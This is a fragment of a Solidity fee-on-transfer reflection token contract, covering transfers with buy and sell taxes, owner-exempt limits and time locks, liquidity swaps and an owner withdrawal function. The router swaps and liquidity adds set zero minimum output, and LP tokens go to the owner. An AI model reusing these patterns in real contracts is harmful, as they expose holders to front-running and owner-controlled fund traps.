    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        if(takeFee) {
            if(sender == uniSwapV2Pair) {
                if(sender != owner() && recipient != owner() && recipient != address(1)){
                    require(tAmount <= _maxInAmount, "Transfer amount exceeds the maxTxAmount.");
                    bool blockedTimeLimitB = lockToBuyOrSellForTime(getFromLastBuy(sender),buyTime);
                    require(blockedTimeLimitB, "blocked Time Limit");
                    walletToPurchaseTime[recipient] = block.timestamp;
                }
                appliedFees = buyRates;
            } else {
                if(sender != owner() && recipient != owner() && recipient != address(1)){
                    require(tAmount <= _maxOutAmount, "Transfer amount exceeds the _maxOutAmount.");
                    //Check time limit for in-game withdrawals
                    bool blockedTimeLimitS = lockToBuyOrSellForTime(getFromLastSell(sender), sellTime);
                    require(blockedTimeLimitS, "blocked Time Limit");
                    walletToSelltime[sender] = block.timestamp;
                }

                appliedFees = sellAndTransferRates;
                appliedFees.liquidity = appliedFees.liquidity;

            }

        }

        valuesFromGetValues memory s = _getValues(tAmount, takeFee);

        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _tOwned[sender] = _tOwned[sender]-tAmount;
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+s.tTransferAmount;
            

        }

        _rOwned[sender] = _rOwned[sender]-s.rAmount;
        _rOwned[recipient] = _rOwned[recipient]+s.rTransferAmount;

        if(takeFee)
        {
            _reflectRfi(s.rRfi, s.tRfi);
            _takeMarketing(s.rMarketing,s.tMarketing);
            _takeLiquidity(s.rLiquidity,s.tLiquidity);
            _takeReward(s.tReward);
            // SEND TAX TO REWARD
            _tOwned[address(bbRewardWallet)] = _tOwned[address(bbRewardWallet)]+s.tReward;
            emit Transfer(sender, address(this), s.tMarketing+s.tLiquidity);


        }

        emit Transfer(sender, recipient, s.tTransferAmount);
        tokenHoldersEnumSet.addic(recipient);

        if(balanceOf(sender)==0)
            tokenHoldersEnumSet.remove(sender);

    }


    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        // split the contract balance into halves
        uint256 toSwap = contractTokenBalance/2;
        uint256 tokensToAddLiquidityWith = contractTokenBalance-toSwap;
        // capture the contract's current BNB balance.
        // this is so that we can capture exactly the amount of BNB that the
        // swap creates, and not make the liquidity event include any BNB that
        // has been manually sent to the contract
        uint256 tokensBalance = balanceOf(address(this));
        uint256 initialBalance = address(this).balance;
        // swap tokens for BNB
        swapTokensForBNB(toSwap);
        // how much BNB did we just swap into?
        uint256 BNBToAddLiquidityWith = address(this).balance.sub(initialBalance);
        // add liquidity to uniswap
        addLiquidity(tokensToAddLiquidityWith, BNBToAddLiquidityWith);
        // adjust balance
        uint256 tokensSwapped = tokensBalance - balanceOf(address(this));
        contractBalance.lp_balance-=tokensSwapped;
        // if any residual BNB token particles are not autoBNBally sent to liquidity, 
        // these tokens will be used for repurchase or injection into liquidity at a later time
    }

    function swapAndSendToMarketing(uint256 tokenAmount) private lockTheSwap {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniSwapV2Router.WETH();

        if(allowance(address(this), address(UniSwapV2Router)) < tokenAmount) {
            _approve(address(this), address(UniSwapV2Router), ~uint256(0));
        }
        contractBalance.marketing_balance-=tokenAmount;
        UniSwapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            bbCoinMarketing,
            block.timestamp
        );

    }

    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniSwapV2Router.WETH();

        if(allowance(address(this), address(UniSwapV2Router)) < tokenAmount) {
            _approve(address(this), address(UniSwapV2Router), ~uint256(0));
        }

        UniSwapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {

        UniSwapV2Router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        emit LiquidityAdded(tokenAmount, BNBAmount);
    }

    function withdrawERC20(
        address tokenAddress,
        address to,
        uint256 amount
    ) external virtual onlyOwner {
        require(tokenAddress.isContract(), "ERC20 token address must be a contract");
        require(tokenAddress!=address(this),"ERC20 Token cannot be this one");

        IERC20 tokenContract = IERC20(tokenAddress);
        require(
            tokenContract.balanceOf(address(this)) >= amount,
            "You are trying to withdraw more funds than available"
        );

        require(tokenContract.transfer(to, amount), "Fail on transfer");
    }
 
}